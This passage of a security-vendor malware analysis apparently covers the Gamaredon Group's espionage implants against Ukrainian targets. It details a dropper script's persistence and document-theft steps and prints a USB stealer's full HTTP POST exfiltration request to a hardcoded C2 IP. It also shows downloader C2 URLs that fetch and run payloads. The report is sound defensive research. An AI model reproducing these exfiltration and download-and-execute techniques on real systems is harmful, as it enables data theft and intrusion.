c. Copy &#8220;SmartArtGraphicsLog.lnk&#8221; to &#8220;%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\&#8221;</p>
<p><a href="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/02/Gamaredon_6.png" rel="wpdevart_lightbox"><img class="alignnone size-full wp-image-24690" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/02/Gamaredon_6.png" alt="gamaredon_6" width="618" height="341" srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/02/Gamaredon_6.png 618w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/02/Gamaredon_6-300x166.png 300w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/02/Gamaredon_6-370x204.png 370w" sizes="(max-width: 618px) 100vw, 618px" /></a></p>
<p><em>Figure 4 Windows XP and Windows 7 logic within &#8220;condirs.cmd&#8221;</em></p>
<p>8. Copy &#8220;winrestore.dll&#8221; to the directory set in step 6 or 7a with the filename &#8220;MSO1234.win&#8221;</p>
<p>9. copy &#8220;LocalSMS.dll&#8221; to the directory set in step 6 or 7a with the filename &#8220;MSO1567.dls&#8221;</p>
<p>10. copy &#8220;OfficeUpdate.dll&#8221; to the directory set in step 6 or 7a with the filename &#8220;MSO5678.usb&#8221;</p>
<p>11. copy &#8220;MpClients.dll&#8221; to the directory set in step 6 or 7a with the filename &#8220;MSO8734.obn&#8221;</p>
<p>12. Execute the exported function &#8220;updater&#8221; within &#8220;MSO1234.win&#8221; using rundll32.exe</p>
<p>13. Execute the exported function &#8220;EntryPoint&#8221; within &#8220;MSO1567.dls&#8221; using rundll32.exe</p>
<p>It should be noted that &#8220;UsrClass.lnk&#8221; links to &#8220;%WINDIR%\system32\rundll32.exe UsrClass.dat{4f6fe187-7034-11de-b675-001d09fa5win}.dll,updater&#8221; and &#8220;SmartArtGraphicsLog.lnk&#8221; links to &#8220;C:\WINDOWS\system32\rundll32.exe UsrClass.dat{4f6fe187-7034-11de-b675-001d09fa5off}.dll,StartBackup&#8221;. These are the locations &#8220;winrestore.dll&#8221; and &#8220;OfficeUpdate.dll&#8221; were copied to in steps 3 and 4, respectively.</p>
<p>The &#8220;condirs.cmd&#8221; script then continues to:</p>
<p>1. Schedule the following tasks:</p>
<p style="padding-left: 30px;">a. Task name &#8220;UpdatesWinRes&#8221;, invoke &#8220;MSO1234.win,updater&#8221;<br />
b. Task name &#8220;UpdatesWinDLL&#8221;, invoke &#8220;MSO1567.dls,EntryPoint&#8221;<br />
c. Task name &#8220;UpdatesWinUSBOOK&#8221;, invoke &#8220;MSO5678.usb,StartBackup&#8221;<br />
d. Task name &#8220;UpdatesWinOBN&#8221;, invoke &#8220;MSO8734.obn,bitDefender&#8221;</p>
<p>2.Ensure the directory &#8220;%Temp%\reports\ProfileSkype\&#8221; exists</p>
<p>3.Kill processes named &#8220;skype.exe&#8221;</p>
<p>4.Copy the contents of &#8220;%AppData%\Skype&#8221; to &#8220;%Temp%\reports\ProfileSkype\&#8221;</p>
<p>5.Create subdirectories under &#8220;%Temp%\reports\%COMPUTERNAME\&#8221; with names: Z W P S V Q N M L K I J F H E G and D. These are drive letters.</p>
<p>6.Copy all files from all above drive letters with extensions &#8220;doc&#8221;, &#8220;docx&#8221;, &#8220;xls&#8221;, &#8220;xlsx&#8221;, &#8220;rtf&#8221; &#8220;odt&#8221; and &#8220;txt&#8221; into &#8220;%TEMP%\reports\%COMPUTERNAME%\%%d\&#8221; where %%d is the drive letter</p>
<p>7.Copy all files with the above extensions from all users&#8217; &#8220;Desktop&#8221;, &#8220;Documents&#8221;, and &#8220;Downloads&#8221; folders to &#8220;%TEMP%\reports\%COMPUTERNAME%\Desktop\&#8221;, &#8220;%TEMP%\reports\%COMPUTERNAME%\Documents\&#8221; and &#8220;%TEMP%\reports\%COMPUTERNAME%\Downloads\&#8221; respectively</p>
<p><a href="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/02/Gamaredon_7.png" rel="wpdevart_lightbox"><img class="alignnone size-full wp-image-24693" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/02/Gamaredon_7.png" alt="gamaredon_7" width="975" height="721" srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/02/Gamaredon_7.png 975w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/02/Gamaredon_7-900x666.png 900w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/02/Gamaredon_7-300x222.png 300w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/02/Gamaredon_7-768x568.png 768w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/02/Gamaredon_7-370x274.png 370w" sizes="(max-width: 975px) 100vw, 975px" /></a></p>
<p><em>Figure 5 The document stealing logic inside &#8220;condirs.cmd&#8221;</em></p>
<p>8.Execute the exported function &#8220;StartBackup&#8221; within &#8220;MSO5678.usb&#8221; using rundll32.exe</p>
<p>9.Execute the exported function &#8220;bitDefender&#8221; within &#8220;MSO8734.obn&#8221; using rundll32.exe</p>
<p>10.Clean up temporary files, sleep, and delete itself</p>
<p>When this script has completed, a series of implants giving the attacker the ability to steal files, capture screenshots and evade detection are deployed on the system. These individual implants are analyzed in detail in Appendix A.</p>
<h3>Trends Across Implants</h3>
<p>While the payloads used to control compromised systems have evolved over time, many commonalities appear across the samples. While not every sample distributed by this group is described in this blog, hashes of the known samples are included in the Indicators of Compromise section. Some interesting behaviors from a few of the related samples include:</p>
<ul>
<li>Many of the batch scripts include misspellings of common English words. One such example is the filename &#8220;cmd&#8221;. While another example, &#8220;domen&#8221;, is used as a variable name in a batch script which is likely meant to be &#8220;domain&#8221;</li>
<li>Almost all batch scripts in all samples ping localhost as a means of sleeping</li>
<li>Many of the batch scripts are named &#8220;cmd&#8221; and some include the string &#8220;Trons_ups&#8221; and &#8220;Treams&#8221;</li>
<li>Many of the batch scripts use the same commands for determining operating system version.</li>
<li>Many of the early samples used applications such as wget, UltraVNC, and ChkFlash. These utilities have been replaced with custom tools in the latest sample</li>
<li>Samples employing VNC used the same configuration and passwords</li>
</ul>
<p>Additionally, the infrastructure used by this group has not changed much in the past three years. Many of the samples reused the same domains for implant communication. Also, many of the custom developed tools use hardcoded network locations.</p>
<p>Monikers used for filenames, exported DLL functions, domains, and variable names in scripts seem to be themed and consistent. By pivoting on indicators from one of the SFX implants within AutoFocus additional samples are easily identified by overlaps in these consistencies. Most samples were delivered in a similar fashion: an SFX dropping resources which are staged and loaded with a batch and/or VBS script. The reuse of SSL certificates between IPv4 addresses as well as the reuse of IPv4 addresses between domains names is apparent when viewing a large collection of entities involved in this campaign, as shown below.</p>
<p><a href="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/02/Gamaredon_8.png" rel="wpdevart_lightbox"><img class="alignnone size-full wp-image-24696" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/02/Gamaredon_8.png" alt="gamaredon_8" width="750" height="633" srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/02/Gamaredon_8.png 750w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/02/Gamaredon_8-300x253.png 300w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/02/Gamaredon_8-370x312.png 370w" sizes="(max-width: 750px) 100vw, 750px" /></a></p>
<p>Focusing in on one of the newest samples (analyzed in Appendix A), the reuse of file names as well as SFX content files becomes apparent.</p>
<p><a href="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/02/Gamaredon_9.png" rel="wpdevart_lightbox"><img class="alignnone size-full wp-image-24699" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/02/Gamaredon_9.png" alt="gamaredon_9" width="750" height="402" srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/02/Gamaredon_9.png 750w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/02/Gamaredon_9-300x161.png 300w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/02/Gamaredon_9-370x198.png 370w" sizes="(max-width: 750px) 100vw, 750px" /></a></p>
<p><em>Figure 6 Overview of the relationships between Samples and Network Infrastructure used by the Gamaredon Group</em></p>
<h3>Final Word</h3>
<p>The implants identified have limited, generic, and often conflicting detections on VirusTotal. The threat group using these implants has been active since at least 2014 and has been seen targeting individuals likely involved in the Ukrainian government. Some of the samples share delivery mechanisms and infrastructure with samples which are detected by a few antivirus vendors as Gamaredon. However, newer variants deliver more advanced malware which goes unnamed.</p>
<p>Periodically, researchers at Palo Alto Networks hunt through WildFire execution reports, using AutoFocus, to identify untagged samples&#8217; artifacts in the hopes of identifying previously undiscovered malware families, behaviors, and campaigns.</p>
<p>This blog presents a threat group identified by the above process using AutoFocus. By actively hunting for malicious activity and files instead of waiting for alerts to triage, defenders can identify and building protections for new trends before they arrive on their corporate networks and endpoints. More details about this threat group can be found in the AutoFocus tag <a href="https://autofocus.paloaltonetworks.com/#/tag/Unit42.GamaredonGroup">GamaredonGroup</a>.</p>
<p>Palo Alto Networks customers are protected from this threat in the following ways:</p>
<ul>
<li>WildFire identifies the malware described in this report as malicious.</li>
<li>Traps prevents execution of the malware described in this report.</li>
<li>The C2 domains used by this group are blocked through Threat Prevention.</li>
</ul>
<p>Special thanks go out to Tom Lancaster for both his assistance in this investigation and for his charming good looks.</p>
<h3>Appendix A: Custom Implant Analyses</h3>
<h4>USBStealer: MSO5678.usb / OfficeUpdate.dll</h4>
<p>This file is a USB file stealer which can be also guessed by its internal name &#8220;USBgrabber.dll&#8221;. However, the implementation is sloppy which makes it a file stealer for any newly connected logical volume on a system. This is because the malware monitors the computer for messages WM_COMMAND and WM_DEVICECHANGE, but not verifying if a USB drive was connected.</p>
<p>The malware creates two mutexes &#8220;__Wsnusb73__&#8221; and &#8220;__Wsnusbtt73__&#8221;. Then, it creates the following folder in the temp path of the local user:</p>
<p>&#8220;C:\Users\&lt;Username&gt;\AppData\Local\Temp\reports&#8221;</p>
<p>This folder is used as a temporary location to copy all files from a newly connected logical drive to and upload them to the C2 server. The files are transferred to the hardcoded C2 server &#8220;195.62.52.93&#8221; one by one via HTTP POST method. The following request is used which also includes information about the victim, the file to be transferred as well as the source drive:</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-5f692876e9625956085227" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
POST /post.php HTTP/1.1
Content-Type: multipart/form-data; boundary=----qwerty
Host: 195.62.52.93
Content-Length: ...
Cache-Control: no-cache

------qwerty
Content-Disposition: form-data; name="filename"

\\&lt;filename&gt;
------qwerty
Content-Disposition: form-data; name="filedate"

&lt;month&gt;/&lt;day&gt;/&lt;year&gt; &lt;hour&gt;:&lt;seconds&gt;
------qwerty
Content-Disposition: form-data; name="compname"

&lt;ComputerName&gt;||&lt;Username&gt;||&lt;UserHWGUID&gt;||&lt;C_VolumeSerialNumber&gt;
------qwerty
Content-Disposition: form-data; name="serial"

&lt;SerialNumberOfDriveToStealFrom&gt;
------qwerty
Content-Disposition: form-data; name="w"

"?"
------qwerty
Content-Disposition: form-data; name="filesize"

&lt;FileSize&gt;
------qwerty
Content-Disposition: form-data; name="file"; filename="&lt;AbsoluteFilePathInTemporaryLocation&gt;"
Content-Type: application/octet-stream
Content-Transfer-Encoding: binary

...File data...

------qwerty--</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-5f692876e9625956085227-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f692876e9625956085227-2">2</div><div class="crayon-num" data-line="crayon-5f692876e9625956085227-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f692876e9625956085227-4">4</div><div class="crayon-num" data-line="crayon-5f692876e9625956085227-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f692876e9625956085227-6">6</div><div class="crayon-num" data-line="crayon-5f692876e9625956085227-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f692876e9625956085227-8">8</div><div class="crayon-num" data-line="crayon-5f692876e9625956085227-9">9</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f692876e9625956085227-10">10</div><div class="crayon-num" data-line="crayon-5f692876e9625956085227-11">11</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f692876e9625956085227-12">12</div><div class="crayon-num" data-line="crayon-5f692876e9625956085227-13">13</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f692876e9625956085227-14">14</div><div class="crayon-num" data-line="crayon-5f692876e9625956085227-15">15</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f692876e9625956085227-16">16</div><div class="crayon-num" data-line="crayon-5f692876e9625956085227-17">17</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f692876e9625956085227-18">18</div><div class="crayon-num" data-line="crayon-5f692876e9625956085227-19">19</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f692876e9625956085227-20">20</div><div class="crayon-num" data-line="crayon-5f692876e9625956085227-21">21</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f692876e9625956085227-22">22</div><div class="crayon-num" data-line="crayon-5f692876e9625956085227-23">23</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f692876e9625956085227-24">24</div><div class="crayon-num" data-line="crayon-5f692876e9625956085227-25">25</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f692876e9625956085227-26">26</div><div class="crayon-num" data-line="crayon-5f692876e9625956085227-27">27</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f692876e9625956085227-28">28</div><div class="crayon-num" data-line="crayon-5f692876e9625956085227-29">29</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f692876e9625956085227-30">30</div><div class="crayon-num" data-line="crayon-5f692876e9625956085227-31">31</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f692876e9625956085227-32">32</div><div class="crayon-num" data-line="crayon-5f692876e9625956085227-33">33</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f692876e9625956085227-34">34</div><div class="crayon-num" data-line="crayon-5f692876e9625956085227-35">35</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f692876e9625956085227-36">36</div><div class="crayon-num" data-line="crayon-5f692876e9625956085227-37">37</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f692876e9625956085227-38">38</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-5f692876e9625956085227-1"><span class="crayon-v">POST</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-v">post</span><span class="crayon-sy">.</span><span class="crayon-e">php </span><span class="crayon-v">HTTP</span><span class="crayon-o">/</span><span class="crayon-cn">1.1</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f692876e9625956085227-2"><span class="crayon-v">Content</span><span class="crayon-o">-</span><span class="crayon-v">Type</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-v">multipart</span><span class="crayon-o">/</span><span class="crayon-v">form</span><span class="crayon-o">-</span><span class="crayon-v">data</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-v">boundary</span><span class="crayon-o">=</span><span class="crayon-o">--</span><span class="crayon-o">--</span><span class="crayon-e">qwerty</span></div><div class="crayon-line" id="crayon-5f692876e9625956085227-3"><span class="crayon-v">Host</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-cn">195.62.52.93</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f692876e9625956085227-4"><span class="crayon-v">Content</span><span class="crayon-o">-</span><span class="crayon-v">Length</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-sy">.</span><span class="crayon-sy">.</span><span class="crayon-sy">.</span></div><div class="crayon-line" id="crayon-5f692876e9625956085227-5"><span class="crayon-v">Cache</span><span class="crayon-o">-</span><span class="crayon-v">Control</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-v">no</span><span class="crayon-o">-</span><span class="crayon-v">cache</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f692876e9625956085227-6">&nbsp;</div><div class="crayon-line" id="crayon-5f692876e9625956085227-7"><span class="crayon-o">--</span><span class="crayon-o">--</span><span class="crayon-o">--</span><span class="crayon-e">qwerty</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f692876e9625956085227-8"><span class="crayon-v">Content</span><span class="crayon-o">-</span><span class="crayon-v">Disposition</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-v">form</span><span class="crayon-o">-</span><span class="crayon-v">data</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-v">name</span><span class="crayon-o">=</span><span class="crayon-s">"filename"</span></div><div class="crayon-line" id="crayon-5f692876e9625956085227-9">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-5f692876e9625956085227-10"><span class="crayon-sy">\</span><span class="crayon-sy">\</span><span class="crayon-o">&lt;</span><span class="crayon-v">filename</span><span class="crayon-o">&gt;</span></div><div class="crayon-line" id="crayon-5f692876e9625956085227-11"><span class="crayon-o">--</span><span class="crayon-o">--</span><span class="crayon-o">--</span><span class="crayon-e">qwerty</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f692876e9625956085227-12"><span class="crayon-v">Content</span><span class="crayon-o">-</span><span class="crayon-v">Disposition</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-v">form</span><span class="crayon-o">-</span><span class="crayon-v">data</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-v">name</span><span class="crayon-o">=</span><span class="crayon-s">"filedate"</span></div><div class="crayon-line" id="crayon-5f692876e9625956085227-13">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-5f692876e9625956085227-14"><span class="crayon-o">&lt;</span><span class="crayon-v">month</span><span class="crayon-o">&gt;</span><span class="crayon-o">/</span><span class="crayon-o">&lt;</span><span class="crayon-v">day</span><span class="crayon-o">&gt;</span><span class="crayon-o">/</span><span class="crayon-o">&lt;</span><span class="crayon-v">year</span><span class="crayon-o">&gt;</span><span class="crayon-h"> </span><span class="crayon-o">&lt;</span><span class="crayon-v">hour</span><span class="crayon-o">&gt;</span><span class="crayon-o">:</span><span class="crayon-o">&lt;</span><span class="crayon-v">seconds</span><span class="crayon-o">&gt;</span></div><div class="crayon-line" id="crayon-5f692876e9625956085227-15"><span class="crayon-o">--</span><span class="crayon-o">--</span><span class="crayon-o">--</span><span class="crayon-e">qwerty</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f692876e9625956085227-16"><span class="crayon-v">Content</span><span class="crayon-o">-</span><span class="crayon-v">Disposition</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-v">form</span><span class="crayon-o">-</span><span class="crayon-v">data</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-v">name</span><span class="crayon-o">=</span><span class="crayon-s">"compname"</span></div><div class="crayon-line" id="crayon-5f692876e9625956085227-17">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-5f692876e9625956085227-18"><span class="crayon-o">&lt;</span><span class="crayon-v">ComputerName</span><span class="crayon-o">&gt;</span><span class="crayon-o">||</span><span class="crayon-o">&lt;</span><span class="crayon-v">Username</span><span class="crayon-o">&gt;</span><span class="crayon-o">||</span><span class="crayon-o">&lt;</span><span class="crayon-v">UserHWGUID</span><span class="crayon-o">&gt;</span><span class="crayon-o">||</span><span class="crayon-o">&lt;</span><span class="crayon-v">C_VolumeSerialNumber</span><span class="crayon-o">&gt;</span></div><div class="crayon-line" id="crayon-5f692876e9625956085227-19"><span class="crayon-o">--</span><span class="crayon-o">--</span><span class="crayon-o">--</span><span class="crayon-e">qwerty</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f692876e9625956085227-20"><span class="crayon-v">Content</span><span class="crayon-o">-</span><span class="crayon-v">Disposition</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-v">form</span><span class="crayon-o">-</span><span class="crayon-v">data</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-v">name</span><span class="crayon-o">=</span><span class="crayon-s">"serial"</span></div><div class="crayon-line" id="crayon-5f692876e9625956085227-21">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-5f692876e9625956085227-22"><span class="crayon-o">&lt;</span><span class="crayon-v">SerialNumberOfDriveToStealFrom</span><span class="crayon-o">&gt;</span></div><div class="crayon-line" id="crayon-5f692876e9625956085227-23"><span class="crayon-o">--</span><span class="crayon-o">--</span><span class="crayon-o">--</span><span class="crayon-e">qwerty</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f692876e9625956085227-24"><span class="crayon-v">Content</span><span class="crayon-o">-</span><span class="crayon-v">Disposition</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-v">form</span><span class="crayon-o">-</span><span class="crayon-v">data</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-v">name</span><span class="crayon-o">=</span><span class="crayon-s">"w"</span></div><div class="crayon-line" id="crayon-5f692876e9625956085227-25">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-5f692876e9625956085227-26"><span class="crayon-s">"?"</span></div><div class="crayon-line" id="crayon-5f692876e9625956085227-27"><span class="crayon-o">--</span><span class="crayon-o">--</span><span class="crayon-o">--</span><span class="crayon-e">qwerty</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f692876e9625956085227-28"><span class="crayon-v">Content</span><span class="crayon-o">-</span><span class="crayon-v">Disposition</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-v">form</span><span class="crayon-o">-</span><span class="crayon-v">data</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-v">name</span><span class="crayon-o">=</span><span class="crayon-s">"filesize"</span></div><div class="crayon-line" id="crayon-5f692876e9625956085227-29">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-5f692876e9625956085227-30"><span class="crayon-o">&lt;</span><span class="crayon-v">FileSize</span><span class="crayon-o">&gt;</span></div><div class="crayon-line" id="crayon-5f692876e9625956085227-31"><span class="crayon-o">--</span><span class="crayon-o">--</span><span class="crayon-o">--</span><span class="crayon-e">qwerty</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f692876e9625956085227-32"><span class="crayon-v">Content</span><span class="crayon-o">-</span><span class="crayon-v">Disposition</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-v">form</span><span class="crayon-o">-</span><span class="crayon-v">data</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-v">name</span><span class="crayon-o">=</span><span class="crayon-s">"file"</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-v">filename</span><span class="crayon-o">=</span><span class="crayon-s">"&lt;AbsoluteFilePathInTemporaryLocation&gt;"</span></div><div class="crayon-line" id="crayon-5f692876e9625956085227-33"><span class="crayon-v">Content</span><span class="crayon-o">-</span><span class="crayon-v">Type</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-v">application</span><span class="crayon-o">/</span><span class="crayon-v">octet</span><span class="crayon-o">-</span><span class="crayon-e">stream</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f692876e9625956085227-34"><span class="crayon-v">Content</span><span class="crayon-o">-</span><span class="crayon-v">Transfer</span><span class="crayon-o">-</span><span class="crayon-v">Encoding</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-i">binary</span></div><div class="crayon-line" id="crayon-5f692876e9625956085227-35">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-5f692876e9625956085227-36"><span class="crayon-sy">.</span><span class="crayon-sy">.</span><span class="crayon-sy">.</span><span class="crayon-e">File </span><span class="crayon-v">data</span><span class="crayon-sy">.</span><span class="crayon-sy">.</span><span class="crayon-sy">.</span></div><div class="crayon-line" id="crayon-5f692876e9625956085227-37">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-5f692876e9625956085227-38"><span class="crayon-o">--</span><span class="crayon-o">--</span><span class="crayon-o">--</span><span class="crayon-v">qwerty</span><span class="crayon-o">--</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0015 seconds] -->
<p>The malware also creates a SQLite database named &#8220;asha.dat&#8221; in the local users temp folder. Therein, it keeps track of files which were stolen by calculating the MD5 hash of the filename followed by the file length. Therefore, it creates a Unicode string of the original file path from the drive and concatenates the file size in bytes to it. Finally, it uses the API functions MD5Init(), MD5Update() and MD5Final() to calculate the hash and store it in the database.</p>
<p><a href="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/02/Gamaredon_10.png" rel="wpdevart_lightbox"><img class="alignnone size-full wp-image-24702" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/02/Gamaredon_10.png" alt="gamaredon_10" width="750" height="189" srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/02/Gamaredon_10.png 750w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/02/Gamaredon_10-300x76.png 300w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/02/Gamaredon_10-370x93.png 370w" sizes="(max-width: 750px) 100vw, 750px" /></a></p>
<p><em>Figure 7 Structure of the database created by the malware</em></p>
<p>It should be noted, that only hashes of files are added to the database that don&#8217;t have the following extensions:</p>
<ul>
<li>DLL</li>
<li>BIN</li>
<li>CAB</li>
<li>EXE</li>
<li>ISO</li>
</ul>
<h3>Downloader: MSO1567.dls / LocalSMS.dll</h3>
<p>This file is essentially a simple downloader which contacts the C2 server to send some user data and get an executable as response which will be executed. The DLL is written in C++ and contains all of the functionality is in an export function named &#8220;EntryPoint&#8221;. The file was compiled without any compiler or linker optimizations, thus the big file size and the remaining PDB path string.</p>
<p>At first, the malware retrieves the temp path of the local user (&#8220;C:\Users\&lt;Username&gt;\AppData\Local\Temp\&#8221;), the computer name (e.g. &#8220;WIN-MLABCSUOVJB&#8221;), the hardware profile GUID (e.g. &#8220;{826ee360-7139-11de-8d20-808e6f6e6263}&#8221;) and the volume serial number of C:\ drive (e.g. &#8220;1956047236&#8221;). Next, it takes the following hardcoded string:</p>
<p>http://adobe.update-service[.]net/index.php?comp=</p>
<p>To create a URL string with the victims information for contacting the C2 server:</p>
<ul>
<li>http://adobe.update-service[.]net/index.php?comp=WIN-MLABCSUOVJB&amp;id=WIN-MLABCSUOVJB_{826ee360-7139-11de-8d20-808e6f6e6263}1956047236</li>
</ul>
<p>To create the filename where the downloaded file will be saved, the malware tries to build a random string of 10 characters. However, due to an implementation error the string always ends up being the same, namely &#8220;frAQBc8Wsa&#8221;. This string gets concatenated with the retrieved local users temp path to the following file path:</p>
<ul>
<li>C:\Users\&lt;Username&gt;\AppData\Local\Temp\frAQBc8Wsa</li>
</ul>
<p>Then, it uses the API function URLDownloadToFileA() to download a payload to disk and executes it via CreateProcess(). Finally, it sleeps for 60 seconds before terminating the payload and the DLL exits.</p>
<h3>Downloader: MSO8734.obn / MpClients.dll</h3>
<p>This file is a slightly more advanced version of LocalSMS.dll downloader. Instead of downloading a payload directly to disk, this file requests a download command from the C2 server which contains the actual payload URL to be used. Therefore, it uses a basic network implementation based on the Winsock functions. All the functionality of this DLL is put into an export function named &#8220;bitDefender&#8221;.</p>
<p>It creates a socket, requests the address of the hardcoded C2 server &#8220;win-restore.ru&#8221; via gethostbyname() and connects to it. Thereafter, it also collects the volume serial number of C:\ drive, the computer name and the hardware profile GUID. With this information, it creates the following string used by a subsequent send() function call:</p>
<p>&#8220;GET /css.php?id=WIN-MLABCSUOVJB_{826ee360-7139-11de-8d20-808e6f6e6263}1956047236 HTTP/1.1<br />
Host: win-restore.ru<br />
Connection: close&#8221;</p>
<p>The response will be stored into a memory buffer via recv() and scanned for the string &#8220;urltoload={&#8220;. As the name suggests, the received data contains the actual URL of the payload inside curly brackets. The URL gets pulled out of the string and is used again as input for the API function URLDownloadToFile(). Again, the same file path will be used to store the payload on disk and execute it:<br />
&#8220;C:\Users\&lt;Username&gt;\AppData\Local\Temp\frAQBc8Wsa&#8221;</p>
<h3>Pteranodon: MSO1234.win / winrestore.dll</h3>
<p>Pteranodon is a backdoor which also can capture screenshots based on a configuration file created on the disk. Further, it uploads the screenshots to the C2 server unencrypted. All the functionality of this DLL is put into an export function named &#8220;updater&#8221;.</p>
<p>At first, it retrieves the %APPDATA% folder of the local user to build the following file path:</p>
